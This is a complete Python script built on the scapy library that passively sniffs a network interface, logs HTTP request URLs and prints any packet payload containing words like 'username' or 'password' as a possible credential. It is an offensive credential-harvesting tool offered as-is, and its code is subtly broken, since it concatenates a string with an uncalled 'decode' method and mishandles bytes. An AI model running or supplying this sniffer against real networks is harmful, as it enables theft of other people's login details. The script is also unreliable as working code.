#!/usr/bin/env python3

import scapy.all as scapy       # scapy
from scapy.layers import http   # scapy_http

interface = "enp0s3"


def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_captured_pkt)


def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path


def get_login_info(packet):
    if packet.haslayer(scapy.Raw):
        load = str(packet[scapy.Raw].load)
        keywords = ["username", "user", "login", "password", "pass"]
        for keyword in keywords:
            if keyword in load:
                return load


def process_captured_pkt(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print("PACKET\n")
        print("[+] HTTP Request >> " + url.decode)
        login_info = get_login_info(packet)
        if login_info:
            print("\n\n" + "[+] Possible username/password >> " + login_info + "\n\n")


sniff(interface)
